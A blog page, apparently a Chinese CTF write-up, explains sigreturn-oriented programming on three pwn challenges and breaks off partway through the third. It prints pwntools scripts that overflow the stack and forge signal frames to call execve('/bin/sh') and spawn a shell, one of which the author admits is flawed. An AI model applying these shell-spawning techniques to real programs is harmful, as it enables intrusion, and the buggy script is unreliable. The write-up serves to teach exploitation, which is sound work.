@@ -1,0 +1,274 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Srop题型 | 墨水彩笔</title><meta name="author" content="徐小宇"><meta name="copyright" content="徐小宇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="rootersctf_2019_sropChecksec 只开了NX保护，且发现程序运行后输入一次就退出 IDA分析 点进来的时候还以为搞错了 分析后得到这里存在一个基础的栈溢出，但这个静态编译给的东西实在太少了，我们就算溢出了也不知道要做什么呀，好歹给个输出函数泄露下地址然后找个libc也好呀，并且开了NX也就是说不能直接写shellcode  进入汇编界面分析，发现存在syscall，此类的系">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Srop题型">
+<meta property="og:url" content="http://example.com/2022/02/16/Srop%E9%A2%98%E5%9E%8B/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="rootersctf_2019_sropChecksec 只开了NX保护，且发现程序运行后输入一次就退出 IDA分析 点进来的时候还以为搞错了 分析后得到这里存在一个基础的栈溢出，但这个静态编译给的东西实在太少了，我们就算溢出了也不知道要做什么呀，好歹给个输出函数泄露下地址然后找个libc也好呀，并且开了NX也就是说不能直接写shellcode  进入汇编界面分析，发现存在syscall，此类的系">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2022-02-16T11:53:57.000Z">
+<meta property="article:modified_time" content="2022-02-21T12:46:48.931Z">
+<meta property="article:author" content="徐小宇">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/02/16/Srop%E9%A2%98%E5%9E%8B/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2022-02-21 20:46:48'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">44</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#rootersctf-2019-srop"><span class="toc-number">1.</span> <span class="toc-text">rootersctf_2019_srop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec"><span class="toc-number">2.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SROP%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">SROP方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-7"><span class="toc-number">6.</span> <span class="toc-text">ciscn_2019_es_7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec-1"><span class="toc-number">7.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90"><span class="toc-number">8.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">9.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#360chunqiu2017-smallest"><span class="toc-number"></span> <span class="toc-text">360chunqiu2017_smallest</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec-2"><span class="toc-number">1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90-1"><span class="toc-number">2.</span> <span class="toc-text">IDA分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%8E%E5%AF%B9%E5%BA%94%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">问题与对应的解决方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Srop题型</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-02-16T11:53:57.000Z" title="Created 2022-02-16 19:53:57">2022-02-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-02-21T12:46:48.931Z" title="Updated 2022-02-21 20:46:48">2022-02-21</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a>rootersctf_2019_srop</h2><h2 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216195934755.png?raw=true" alt="image-20220216195934755.png"></p>
+<p>只开了NX保护，且发现程序运行后输入一次就退出</p>
+<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216200038174.png?raw=true" alt="image-20220216200038174.png"></p>
+<p>点进来的时候还以为搞错了</p>
+<p>分析后得到这里存在一个基础的栈溢出，但这个静态编译给的东西实在太少了，我们就算溢出了也不知道要做什么呀，好歹给个输出函数泄露下地址然后找个libc也好呀，并且开了NX也就是说不能直接写shellcode</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216200247131.png?raw=true" alt="image-20220216200247131.png"></p>
+<p>进入汇编界面分析，发现存在syscall，此类的系统调用号可以使用，may be这就是办法，但我们此时可以调用中断，但不能传递参数，那么要怎么办呢</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="SROP方法"><a href="#SROP方法" class="headerlink" title="SROP方法"></a>SROP方法</h3><p>首先我们可以利用syscall那么我们就可以利用这个中断来调用srop方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">中断号</span><br><span class="line">#define __NR_rt_sigreturn 15</span><br><span class="line">链接</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_29343201&#x2F;article&#x2F;details&#x2F;52209588</span><br></pre></td></tr></table></figure>
+
+<p>那么什么是Srop办法呢</p>
+<p>这个大家可以去看我给的参考链接，这里我直接换我的理解来表达</p>
+<p>1.首先利用Srop办法的前提是可以调用syscall中断</p>
+<p>中个中断的意思大概是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</span><br><span class="line"></span><br><span class="line">内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</span><br></pre></td></tr></table></figure>
+
+<p>总结一下，就是调用该中断后我们会先进入挂起状态，在这个状态下相对于保护了现场（也可以理解这里调用了别的函数，现在这些压入一个类似于栈的地方保存了起来，这只是比喻），那么我们的Srop办法，就是可以在这个挂起状态下修改内容，使得当我们恢复现场的时候程序的运行流程已经被我们修改。</p>
+<p>参考链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;stackoverflow&#x2F;x86&#x2F;advanced-rop&#x2F;srop&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.首先我们需要找到一些函数来帮助我们完成布局</p>
+<p>要完成系统调用，那么我们需要pop_rax这个函数，因为rax的值是系统调用号的值</p>
+<p>然后我们在多次调用Signal Frame时需要有一个syscall;ret函数作为铺垫</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop_system &#x3D; 0x401032 #pop_rax_system_leave_ret</span><br><span class="line">system_ret &#x3D; 0x401033 #system_leave_ret</span><br><span class="line">syscall_addr &#x3D; 0x4101F</span><br></pre></td></tr></table></figure>
+
+<p>2.构造第一次攻击</p>
+<p>第一次攻击中我们首先需要能够写入一个/bin/sh\x00为后面的execv调用提供参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">frame &#x3D; SigreturnFrame()	#这个有一个前提，context.arch &#x3D; &#39;amd64&#39;要先明确自己是64位还是32位</span><br><span class="line">frame.rax &#x3D; 0 #read_num		#系统调用号</span><br><span class="line">frame.rdi &#x3D; 0				#第一个参数</span><br><span class="line">frame.rsi &#x3D; bss_addr		#第二个参数</span><br><span class="line">frame.rdx &#x3D; 0x250			#第三个参数</span><br><span class="line">							#最终结果read(0,bss_addr,0x250)</span><br><span class="line">frame.rip &#x3D; system_ret		#系统调用read函数</span><br><span class="line">#frame.rsp &#x3D; bss_addr		#因为这里的ret是leave ret可以实现栈转移，所以主要需要控制rbp的内容</span><br><span class="line">frame.rbp &#x3D; bss_addr</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x88 + p64(pop_system) + p64(0xf) + str(frame) </span><br><span class="line">#这里首先填充0x88字节达到栈溢出，然后利用pop_rax在rax寄存器中填入系统调用号0xf,然后就是srop攻击</span><br></pre></td></tr></table></figure>
+
+<p>3.构造第二次攻击</p>
+<p>第二次攻击时，栈的位置已经是bss_addr</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; 59 #execv_num	#execv的系统调用号</span><br><span class="line">frame.rdi &#x3D; bss_addr		#execv的第一个参数</span><br><span class="line">frame.rsi &#x3D; 0</span><br><span class="line">frame.rdx &#x3D; 0</span><br><span class="line">							#这里要主要execv有三个参数，后两个必须为0</span><br><span class="line">frame.rip &#x3D; system_ret</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39; + p64(pop_system) + p64(0xf) + str(frame)</span><br><span class="line">#首先写入execv的参数，然后就是调用sigreturn</span><br></pre></td></tr></table></figure>
+
+<p>大家可能好奇为什么这里直接填入rax等的值就可以直接修改了，那是因为当我们保护现场后的结构如下</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216201732387.png?raw=true" alt="image-20220216201732387.png"></p>
+<p>这里每个参数最后都会以pop的形式恢复，因此我们修改完它们的值之后就可以达到修改的目的了</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;rootersctf_2019_srop&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;rootersctf_2019_srop&#39;)</span><br><span class="line">context.arch &#x3D; &#39;amd64&#39;</span><br><span class="line">pop_system &#x3D; 0x401032 #pop_rax_system_leave_ret</span><br><span class="line">system_ret &#x3D; 0x401033 #system_leave_ret</span><br><span class="line">syscall_addr &#x3D; 0x4101F</span><br><span class="line">bss_addr &#x3D; 0x402000 </span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Hey, can i get some feedback for the CTF?&#39;)</span><br><span class="line"></span><br><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; 0 #read_num</span><br><span class="line">frame.rdi &#x3D; 0</span><br><span class="line">frame.rsi &#x3D; bss_addr</span><br><span class="line">frame.rdx &#x3D; 0x250</span><br><span class="line">frame.rip &#x3D; system_ret</span><br><span class="line">#frame.rsp &#x3D; bss_addr</span><br><span class="line">frame.rbp &#x3D; bss_addr</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x88 + p64(pop_system) + p64(0xf) + str(frame) </span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; 59 #execv_num</span><br><span class="line">frame.rdi &#x3D; bss_addr</span><br><span class="line">frame.rsi &#x3D; 0</span><br><span class="line">frame.rdx &#x3D; 0</span><br><span class="line">frame.rip &#x3D; system_ret</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39; + p64(pop_system) + p64(0xf) + str(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h2><h2 id="Checksec-1"><a href="#Checksec-1" class="headerlink" title="Checksec"></a>Checksec</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216201942599.png?raw=true" alt="image-20220216201942599.png"></p>
+<p>运行后会打印一遍输入，并且出现一些奇怪的输出</p>
+<h2 id="利用IDA分析"><a href="#利用IDA分析" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216202112083.png?raw=true" alt="image-20220216202112083.png"></p>
+<p>存在一个栈溢出漏洞</p>
+<p>进入汇编语言分析</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216202201348.png?raw=true" alt="image-20220216202201348.png"></p>
+<p>存在syscall函数</p>
+<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>根据上一题的经验我们知道SROP的攻击流程大致如下</p>
+<p>1.首先调用__NR_rt_sigreturn </p>
+<p>2.完成execv的系统调用</p>
+<p>那么在第一步骤下我们需要通过rax传递参数</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216203001557.png?raw=true" alt="image-20220216203001557.png"></p>
+<p>但我们却没有找到一个合适的参数，那么我们只能进入IDA里面通过查找看看了</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216203104329.png?raw=true" alt="image-20220216203104329.png"></p>
+<p>居然有一个直接是传递0xf的rax积木</p>
+<p>那么第一个问题就这样解决了</p>
+<p>第二个问题是Execv的调用下，我们需要传入/bin/sh\x00参数，我有一个大胆的想法就是直接写</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216203948919.png?raw=true" alt="image-20220216203948919.png"></p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216204036883.png?raw=true" alt="image-20220216204036883.png"></p>
+<p>这个报错去网上查了一下好像是因为这里我们直接传了个’/bin/sh\x00’字符串，这样是不行的必须要传地址</p>
+<p>那么我们咋搞出栈地址呢</p>
+<p>还记得测试运行的时候出来的那串乱码吗，也许我们可以利用sys_write试试能不能泄露地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;*3 + p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>因为write函数可以输出0x30大小的内容，我们可以先填充满然后ret回我们的输入函数这样就可以再次输入了</p>
+<p>但我发现这样子的时候gdb是报错的于是我只好去看看网上的做法</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216204844311.png?raw=true" alt="image-20220216204844311.png"></p>
+<p>真的细节了，这里我们之前不是发现是直接syscall_ret的嘛，和我们以前的leave_ret相比少了个pop_ebp那么此时的溢出填充那么就不再是0x18了，而是0x10</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;ciscn_2019_es_7&#39;)</span><br><span class="line">context.arch &#x3D; &#39;amd64&#39;</span><br><span class="line">syscall_ret &#x3D; 0x400517</span><br><span class="line">call_srop &#x3D; 0x4004da</span><br><span class="line">context.log_level &#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">vuln_addr &#x3D; 0x004004ED</span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;*2 + p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">stack_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) -0x118</span><br><span class="line">#这里是因为我们gdb调试的时候发现这时候&#x2F;bin&#x2F;sh\x00存在rsi中，且地址和我们接收的地址每次相差0x118所以确定位置</span><br><span class="line">print(hex(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; 59</span><br><span class="line">frame.rsi &#x3D; stack_addr</span><br><span class="line">frame.rdi &#x3D; 0</span><br><span class="line">frame.rdx &#x3D; 0</span><br><span class="line">frame.rip &#x3D; syscall_ret</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;* 0x10 + p64(call_srop) + p64(syscall_ret) + str(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>当我以为已经结束的时候，发现并不能打通，那么是为什么呢</p>
+<p>我们好好看看第二次send的数据，我们这这时候用的栈还是同一个栈呀，我们直接用’a’挤掉了/bin/sh\x00参数，卧槽</p>
+<p>并且这里还有个一个小错误，那就是传参顺序我写错了</p>
+<h1 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h1><h2 id="Checksec-2"><a href="#Checksec-2" class="headerlink" title="Checksec"></a>Checksec</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216211037309.png?raw=true" alt="image-20220216211037309.png"></p>
+<p>只开了NX保护，且运行过程中给出一次输入机会就结束</p>
+<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216211136870.png?raw=true" alt="image-20220216211136870.png"></p>
+<p>比第一题还干净，而且这个溢出不是直接溢出的意思嘛</p>
+<p>进入汇编界面看看有什么能收集的信息</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216211434387.png?raw=true" alt="image-20220216211434387.png"></p>
+<p>这存在一个系统调用，那么我们看看能不能存在一个pop_rdi这样就可以利用mov_rdi_rax来完成传参了</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220216211521788.png?raw=true" alt="image-20220216211521788.png"></p>
+<p>真的干净</p>
+<p>那我们要怎么解决传参问题呢？</p>
+<h3 id="问题与对应的解决方法"><a href="#问题与对应的解决方法" class="headerlink" title="问题与对应的解决方法"></a>问题与对应的解决方法</h3><p>1.泄露栈地址</p>
+<p>因为我们最后的结果是要利用execve（）函数的需要传入参数，那么参数的位置在栈上，因此需要栈的地址</p>
+<p>2.怎么pop_rax</p>
+<p>我们要控制rax才能进行系统中断来完成系统调用</p>
+<p>首先我们看看如果要在该程序下泄露地址的话，只能利用原有的内容</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220217211634497.png?raw=true" alt="image-20220217211634497.png"></p>
+<p>红框区域异或操作强制将rax修改为0，那么我们系统调用的就只能是read，有没有办法将它跳过，然后将rax改为1那么我们就可以调用write函数来泄露地址了</p>
+<p>我们看看gdb的内容</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220217211835809.png?raw=true" alt="image-20220217211835809.png"></p>
+<p>我们发现rax是一个类似于计数一样的寄存器，它的值是我们输入内容的长度，也就是说假如我们输入一字节内容，那么rax=1</p>
